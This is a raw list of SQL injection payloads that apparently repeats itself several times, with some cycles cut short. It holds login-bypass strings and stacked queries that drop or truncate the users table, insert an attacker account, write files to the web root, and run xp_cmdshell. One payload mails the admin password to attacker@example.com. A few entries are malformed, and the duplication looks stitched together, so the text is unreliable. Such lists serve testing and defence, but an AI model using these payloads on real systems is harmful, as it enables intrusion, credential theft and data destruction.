SELECT * FROM users WHERE username='admin' AND password=(SELECT MAX(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT AVG(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT SUM(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CONCAT(username, '-', password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COALESCE(password, 'No password') FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT NULLIF(password, '') FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CAST(password AS INT) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CHAR(65) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT ASCII(SUBSTRING(password,1,1)) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM non_existent_table);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%');
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION ALL SELECT NULL,NULL,NULL;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) ORDER BY 1;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) GROUP BY username;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT() FROM users) HAVING COUNT() > 1;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) LIMIT 1,1;
' OR 'a'='a
' OR 'a'='b
' OR '1'='1
' OR '1'='2
' OR 1=1--
' OR 1=2--
' OR 'a'='a'--
' OR 'a'='b'--
1 OR 'a'='a'
1 OR 'a'='b'
1 OR '1'='1'
1 OR '1'='2'
' OR 1/0 --
' OR 1/1 --
' OR 1/2 --
' OR 'a'='a'--
' OR 'a'='b'--
' OR '1'='1'--
' OR '1'='2'--
UNION ALL VALUES (1,2,3)--
UNION ALL VALUES (1,2,3)--
UNION ALL VALUES (1,2,3)--
1 OR 'a'='a'
1 OR 'a'='b'
1 OR '1'='1'
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM non_existent_table);--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%');--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION ALL SELECT NULL,NULL,NULL;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) ORDER BY 1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) GROUP BY username;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) HAVING COUNT(*) > 1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) LIMIT 1,1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION SELECT * FROM sensitive_data;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) INTO OUTFILE '/var/www/html/output.txt';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR XML PATH;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON PATH;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR XML RAW;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON AUTO;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON AUTO, INCLUDE_NULL_VALUES;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) INTO DUMPFILE '/var/www/html/output.txt';--
1'; UPDATE users SET password='new_password' WHERE username='admin';--
1'; DELETE FROM users WHERE username='admin';--
1'; INSERT INTO users (username, password) VALUES ('attacker', 'hacked');--
1'; CREATE TABLE malicious_table (data VARCHAR(255));--
1'; DROP TABLE users;--
1'; ALTER TABLE users ADD COLUMN email VARCHAR(255);--
1'; TRUNCATE TABLE users;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%') OR 1=1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND '1'='1';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND '1'='2';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a'='a';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a'='b';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a' LIKE 'a%';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a' LIKE 'b%';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND LENGTH('abc')=3;--
1'; DECLARE @var INT; SET @var = (SELECT COUNT(*) FROM users); IF @var > 1 RAISERROR('Too many rows', 16, 1); --
1'; EXEC sp_executesql N'SELECT * FROM users WHERE username = @username AND password = @password', N'@username NVARCHAR(50), @password NVARCHAR(50)', @username = 'admin', @password = 'password'; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC sp_send_dbmail @recipients='attacker@example.com', @subject='SQLi attack', @body=@var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC xp_cmdshell @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC xp_cmdshell 'echo ' + @var + ' > C:\output.txt'; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC master.dbo.xp_cmdshell @var; --
1'; CREATE VIEW malicious_view AS SELECT * FROM users; --
1'; CREATE TRIGGER malicious_trigger ON users FOR INSERT AS INSERT INTO logs (log_data) VALUES ('User inserted'); --
1'; CREATE FUNCTION malicious_function() RETURNS TABLE AS RETURN (SELECT * FROM users); SELECT * FROM malicious_function(); --
1'; EXEC('SELECT * FROM users WHERE username = ''' + 'admin' + ''' AND password = ''' + 'password' + ''''); --
1'; MERGE INTO users USING (SELECT 'admin' AS username, 'password' AS password) AS attacker ON users.username = attacker.username WHEN MATCHED THEN UPDATE SET users.password = attacker.password; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + ':' + password FROM users); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + ':' + password FROM users FOR XML PATH('')); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + CHAR(58) + password FROM users); PRINT @var; --
 OR 1=(SELECT 1/0); --
' OR 1=(SELECT COUNT(*) FROM non_existent_table); --
' OR 1=(SELECT CAST('test' AS INT)); --
' OR 1=(SELECT COALESCE(username, 'admin')) FROM users WHERE username='admin'; --
' OR 1=(SELECT CASE WHEN (1=1) THEN 'a' ELSE (SELECT username FROM users WHERE username='admin') END); --
' OR 1=(SELECT 1 FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users)>0); --
' OR 1=(SELECT username FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users)>1); --
' OR 1=(SELECT IFNULL(username, 'admin') FROM users WHERE username='admin'); --
' OR 1=(SELECT CONCAT(username, password) FROM users WHERE username='admin'); --
' OR 1=(SELECT NULLIF(username, '') FROM users WHERE username='admin'); --
' OR 1=(SELECT 1/0); --
' OR 1=(SELECT CAST('test' AS INT)); --
' OR 1=(SELECT COALESCE(username, 'admin')) FROM users WHERE username='admin'; --
' OR 1=(SELECT CASE WHEN (1=1) THEN 'a' ELSE (SELECT username FROM users WHERE username='admin') END); --
' OR 1=(SELECT IFNULL(username, 'admin') FROM users WHERE username='admin'); --
' OR 1=(SELECT CONCAT(username, password) FROM users WHERE username='admin'); --
' OR 1=(SELECT NULLIF(username, '') FROM users WHERE username='admin'); --
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT TOP 1 password FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT MIN(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT MAX(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT AVG(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT SUM(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CONCAT(username, '-', password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COALESCE(password, 'No password') FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT NULLIF(password, '') FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CAST(password AS INT) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CHAR(65) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT ASCII(SUBSTRING(password,1,1)) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM non_existent_table);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%');
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION ALL SELECT NULL,NULL,NULL;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) ORDER BY 1;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) GROUP BY username;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT() FROM users) HAVING COUNT() > 1;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) LIMIT 1,1;
' OR 'a'='a
' OR 'a'='b
' OR '1'='1
' OR '1'='2
' OR 1=1--
' OR 1=2--
' OR 'a'='a'--
' OR 'a'='b'--
1 OR 'a'='a'
1 OR 'a'='b'
1 OR '1'='1'
1 OR '1'='2'
' OR 1/0 --
' OR 1/1 --
' OR 1/2 --
' OR 'a'='a'--
' OR 'a'='b'--
' OR '1'='1'--
' OR '1'='2'--
UNION ALL VALUES (1,2,3)--
UNION ALL VALUES (1,2,3)--
UNION ALL VALUES (1,2,3)--
1 OR 'a'='a'
1 OR 'a'='b'
1 OR '1'='1'
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM non_existent_table);--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%');--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION ALL SELECT NULL,NULL,NULL;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) ORDER BY 1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) GROUP BY username;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) HAVING COUNT(*) > 1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) LIMIT 1,1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION SELECT * FROM sensitive_data;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) INTO OUTFILE '/var/www/html/output.txt';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR XML PATH;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON PATH;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR XML RAW;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON AUTO;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON AUTO, INCLUDE_NULL_VALUES;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) INTO DUMPFILE '/var/www/html/output.txt';--
1'; UPDATE users SET password='new_password' WHERE username='admin';--
1'; DELETE FROM users WHERE username='admin';--
1'; INSERT INTO users (username, password) VALUES ('attacker', 'hacked');--
1'; CREATE TABLE malicious_table (data VARCHAR(255));--
1'; DROP TABLE users;--
1'; ALTER TABLE users ADD COLUMN email VARCHAR(255);--
1'; TRUNCATE TABLE users;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%') OR 1=1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND '1'='1';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND '1'='2';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a'='a';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a'='b';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a' LIKE 'a%';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a' LIKE 'b%';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND LENGTH('abc')=3;--
1'; DECLARE @var INT; SET @var = (SELECT COUNT(*) FROM users); IF @var > 1 RAISERROR('Too many rows', 16, 1); --
1'; EXEC sp_executesql N'SELECT * FROM users WHERE username = @username AND password = @password', N'@username NVARCHAR(50), @password NVARCHAR(50)', @username = 'admin', @password = 'password'; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC sp_send_dbmail @recipients='attacker@example.com', @subject='SQLi attack', @body=@var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC xp_cmdshell @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC xp_cmdshell 'echo ' + @var + ' > C:\output.txt'; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC master.dbo.xp_cmdshell @var; --
1'; CREATE VIEW malicious_view AS SELECT * FROM users; --
1'; CREATE TRIGGER malicious_trigger ON users FOR INSERT AS INSERT INTO logs (log_data) VALUES ('User inserted'); --
1'; CREATE FUNCTION malicious_function() RETURNS TABLE AS RETURN (SELECT * FROM users); SELECT * FROM malicious_function(); --
1'; EXEC('SELECT * FROM users WHERE username = ''' + 'admin' + ''' AND password = ''' + 'password' + ''''); --
1'; MERGE INTO users USING (SELECT 'admin' AS username, 'password' AS password) AS attacker ON users.username = attacker.username WHEN MATCHED THEN UPDATE SET users.password = attacker.password; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + ':' + password FROM users); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + ':' + password FROM users FOR XML PATH('')); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + CHAR(58) + password FROM users); PRINT @var; --
 OR 1=(SELECT 1/0); --
' OR 1=(SELECT COUNT(*) FROM non_existent_table); --
' OR 1=(SELECT CAST('test' AS INT)); --
' OR 1=(SELECT COALESCE(username, 'admin')) FROM users WHERE username='admin'; --
' OR 1=(SELECT CASE WHEN (1=1) THEN 'a' ELSE (SELECT username FROM users WHERE username='admin') END); --
' OR 1=(SELECT 1 FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users)>0); --
' OR 1=(SELECT username FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users)>1); --
' OR 1=(SELECT IFNULL(username, 'admin') FROM users WHERE username='admin'); --
' OR 1=(SELECT CONCAT(username, password) FROM users WHERE username='admin'); --
' OR 1=(SELECT NULLIF(username, '') FROM users WHERE username='admin'); --
' OR 1=(SELECT 1/0); --
' OR 1=(SELECT CAST('test' AS INT)); --
' OR 1=(SELECT COALESCE(username, 'admin')) FROM users WHERE username='admin'; --
' OR 1=(SELECT CASE WHEN (1=1) THEN 'a' ELSE (SELECT username FROM users WHERE username='admin') END); --
' OR 1=(SELECT IFNULL(username, 'admin') FROM users WHERE username='admin'); --
' OR 1=(SELECT CONCAT(username, password) FROM users WHERE username='admin'); --
' OR 1=(SELECT NULLIF(username, '') FROM users WHERE username='admin'); --
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT TOP 1 password FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT MIN(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT MAX(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT AVG(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT SUM(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CONCAT(username, '-', password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COALESCE(password, 'No password') FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT NULLIF(password, '') FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CAST(password AS INT) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CHAR(65) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT ASCII(SUBSTRING(password,1,1)) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM non_existent_table);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%');
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION ALL SELECT NULL,NULL,NULL;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) ORDER BY 1;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) GROUP BY username;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT() FROM users) HAVING COUNT() > 1;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) LIMIT 1,1;
' OR 'a'='a
' OR 'a'='b
' OR '1'='1
' OR '1'='2
' OR 1=1--
' OR 1=2--
' OR 'a'='a'--
' OR 'a'='b'--
1 OR 'a'='a'
1 OR 'a'='b'
1 OR '1'='1'
1 OR '1'='2'
' OR 1/0 --
' OR 1/1 --
' OR 1/2 --
' OR 'a'='a'--
' OR 'a'='b'--
' OR '1'='1'--
' OR '1'='2'--
UNION ALL VALUES (1,2,3)--
UNION ALL VALUES (1,2,3)--
UNION ALL VALUES (1,2,3)--
1 OR 'a'='a'
1 OR 'a'='b'
1 OR '1'='1'
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM non_existent_table);--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%');--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION ALL SELECT NULL,NULL,NULL;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) ORDER BY 1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) GROUP BY username;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) HAVING COUNT(*) > 1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) LIMIT 1,1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION SELECT * FROM sensitive_data;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) INTO OUTFILE '/var/www/html/output.txt';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR XML PATH;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON PATH;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR XML RAW;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON AUTO;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON AUTO, INCLUDE_NULL_VALUES;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) INTO DUMPFILE '/var/www/html/output.txt';--
1'; UPDATE users SET password='new_password' WHERE username='admin';--
1'; DELETE FROM users WHERE username='admin';--
1'; INSERT INTO users (username, password) VALUES ('attacker', 'hacked');--
1'; CREATE TABLE malicious_table (data VARCHAR(255));--
1'; DROP TABLE users;--
1'; ALTER TABLE users ADD COLUMN email VARCHAR(255);--
1'; TRUNCATE TABLE users;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%') OR 1=1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND '1'='1';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND '1'='2';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a'='a';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a'='b';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a' LIKE 'a%';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a' LIKE 'b%';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND LENGTH('abc')=3;--
1'; DECLARE @var INT; SET @var = (SELECT COUNT(*) FROM users); IF @var > 1 RAISERROR('Too many rows', 16, 1); --
1'; EXEC sp_executesql N'SELECT * FROM users WHERE username = @username AND password = @password', N'@username NVARCHAR(50), @password NVARCHAR(50)', @username = 'admin', @password = 'password'; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC sp_send_dbmail @recipients='attacker@example.com', @subject='SQLi attack', @body=@var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC xp_cmdshell @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC xp_cmdshell 'echo ' + @var + ' > C:\output.txt'; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC master.dbo.xp_cmdshell @var; --
1'; CREATE VIEW malicious_view AS SELECT * FROM users; --
1'; CREATE TRIGGER malicious_trigger ON users FOR INSERT AS INSERT INTO logs (log_data) VALUES ('User inserted'); --
1'; CREATE FUNCTION malicious_function() RETURNS TABLE AS RETURN (SELECT * FROM users); SELECT * FROM malicious_function(); --
1'; EXEC('SELECT * FROM users WHERE username = ''' + 'admin' + ''' AND password = ''' + 'password' + ''''); --
1'; MERGE INTO users USING (SELECT 'admin' AS username, 'password' AS password) AS attacker ON users.username = attacker.username WHEN MATCHED THEN UPDATE SET users.password = attacker.password; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + ':' + password FROM users); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + ':' + password FROM users FOR XML PATH('')); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + CHAR(58) + password FROM users); PRINT @var; --
 OR 1=(SELECT 1/0); --
' OR 1=(SELECT COUNT(*) FROM non_existent_table); --
' OR 1=(SELECT CAST('test' AS INT)); --
' OR 1=(SELECT COALESCE(username, 'admin')) FROM users WHERE username='admin'; --
' OR 1=(SELECT CASE WHEN (1=1) THEN 'a' ELSE (SELECT username FROM users WHERE username='admin') END); --
' OR 1=(SELECT 1 FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users)>0); --
' OR 1=(SELECT username FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users)>1); --
' OR 1=(SELECT IFNULL(username, 'admin') FROM users WHERE username='admin'); --
' OR 1=(SELECT CONCAT(username, password) FROM users WHERE username='admin'); --
' OR 1=(SELECT NULLIF(username, '') FROM users WHERE username='admin'); --
' OR 1=(SELECT 1/0); --
' OR 1=(SELECT CAST('test' AS INT)); --
' OR 1=(SELECT COALESCE(username, 'admin')) FROM users WHERE username='admin'; --
' OR 1=(SELECT CASE WHEN (1=1) THEN 'a' ELSE (SELECT username FROM users WHERE username='admin') END); --
' OR 1=(SELECT IFNULL(username, 'admin') FROM users WHERE username='admin'); --
' OR 1=(SELECT CONCAT(username, password) FROM users WHERE username='admin'); --
' OR 1=(SELECT NULLIF(username, '') FROM users WHERE username='admin'); --
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT TOP 1 password FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT MIN(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT MAX(password) FROM users);
UNION ALL VALUES (1,2,3)--
UNION ALL VALUES (1,2,3)--
SELECT * FROM users WHERE username='admin' AND password=(SELECT CONCAT(username, '-', password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COALESCE(password, 'No password') FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT NULLIF(password, '') FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CAST(password AS INT) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CHAR(65) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT ASCII(SUBSTRING(password,1,1)) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM non_existent_table);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%');
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION ALL SELECT NULL,NULL,NULL;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) ORDER BY 1;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) GROUP BY username;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT() FROM users) HAVING COUNT() > 1;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) LIMIT 1,1;
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM non_existent_table);--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%');--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION ALL SELECT NULL,NULL,NULL;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) ORDER BY 1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) GROUP BY username;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) HAVING COUNT(*) > 1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) LIMIT 1,1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION SELECT * FROM sensitive_data;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) INTO OUTFILE '/var/www/html/output.txt';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR XML PATH;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON PATH;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR XML RAW;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON AUTO;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON AUTO, INCLUDE_NULL_VALUES;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) INTO DUMPFILE '/var/www/html/output.txt';--
1'; UPDATE users SET password='new_password' WHERE username='admin';--
1'; DELETE FROM users WHERE username='admin';--
1'; INSERT INTO users (username, password) VALUES ('attacker', 'hacked');--
1'; CREATE TABLE malicious_table (data VARCHAR(255));--
1'; DROP TABLE users;--
1'; ALTER TABLE users ADD COLUMN email VARCHAR(255);--
1'; TRUNCATE TABLE users;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%') OR 1=1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND '1'='1';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND '1'='2';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a'='a';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a'='b';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a' LIKE 'a%';--
